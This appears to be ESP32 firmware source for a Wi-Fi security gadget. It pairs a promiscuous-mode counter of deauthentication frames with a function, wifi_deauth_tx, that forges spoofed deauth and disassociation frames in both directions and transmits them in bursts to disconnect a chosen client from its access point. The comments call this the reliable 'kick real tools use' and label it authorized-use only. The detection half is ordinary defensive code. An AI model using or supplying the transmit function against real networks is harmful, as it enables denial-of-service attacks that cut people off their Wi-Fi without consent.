#include "deauth_detect.h"
#include "power_ctl.h"
#include "power_level.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

// Counts deauth/disassoc frames in the air via WiFi promiscuous (monitor) mode.
// ponytail: shares the WiFi radio with the scanner — running both at once needs
// arbitration on hardware; and a single channel is watched unless you hop. See BRINGUP.
static volatile uint32_t s_count = 0;
static bool s_on = false;

static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
  if (is_deauth(p->payload, p->rx_ctrl.sig_len)) s_count++;
}

void deauth_begin() {
  if (s_on) return;
  WiFi.mode(WIFI_STA);
  esp_wifi_set_max_tx_power(pwr_wifi_qdbm(power_level()));   // intensity dial
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
  s_on = true;
}

bool     deauth_active() { return s_on; }
uint32_t deauth_count()  { return s_count; }

static bool mac_is_broadcast(const uint8_t a[6]) {
  for (int i = 0; i < 6; i++) if (a[i] != 0xFF) return false;
  return true;
}

// Authorized-use targeted deauth. Per burst it sends deauth AND disassoc toward
// the client (AP->client); for a specific (non-broadcast) client it ALSO sends
// both toward the AP (client->AP) — the bidirectional kick real tools use, which
// disconnects far more reliably than a single deauth. Frames are built by the
// host-tested builders; esp_wifi_80211_tx pushes them. Bring-up (needs the radio
// + a target on-channel). Targeted only — NOT a mass/area jammer.
bool wifi_deauth_tx(const uint8_t dst[6], const uint8_t bssid[6],
                    uint16_t reason, int bursts) {
  if (!s_on) deauth_begin();                  // promiscuous iface is enough to TX
  uint8_t f[DEAUTH_FRAME_LEN];
  bool ok = true;
  bool targeted = !mac_is_broadcast(dst);
  for (int i = 0; i < bursts; i++) {
    deauth_frame_ex(dst, bssid, bssid, reason, f);           // AP -> client deauth
    if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false) != ESP_OK) ok = false;
    disassoc_frame_ex(dst, bssid, bssid, reason, f);         // AP -> client disassoc
    if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false) != ESP_OK) ok = false;
    if (targeted) {
      deauth_frame_ex(bssid, dst, bssid, reason, f);         // client -> AP deauth
      esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false);
      disassoc_frame_ex(bssid, dst, bssid, reason, f);       // client -> AP disassoc
      esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false);
    }
    delay(1);
  }
  return ok;
}
